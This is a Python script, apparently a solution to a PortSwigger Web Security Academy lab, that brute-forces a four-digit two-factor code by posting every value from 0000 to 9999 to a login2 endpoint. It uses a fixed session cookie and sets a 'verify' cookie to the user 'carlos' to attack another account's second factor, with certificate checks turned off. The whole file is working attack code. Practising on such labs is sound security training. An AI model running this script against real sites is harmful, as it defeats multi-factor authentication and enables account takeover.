import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def zero_extend(string):
    if len(string) < 4:
        string = '0' + string
        return zero_extend(string)
    else:
        return string


def bruteforce(url):
    for i in range(0,10000):
        mfa = zero_extend(str(i))
        cookies = {'session': 'gVUgVKbTiux7oYdUk62dCoNuE34WtaAh', 'verify': 'carlos'}
        data = {'mfa-code': mfa}
        resp = requests.post(url, cookies=cookies, data=data, verify=False)
        if 'Incorrect security code' in resp.text:
            print('[+] Attempt -', i, '- MFA code', mfa, 'is incorrect.')
        else:
            print('[+] FOUND MFA code:', mfa)
            break

bruteforce('https://0a2c007103176327c04838cf00fd007f.web-security-academy.net/login2')
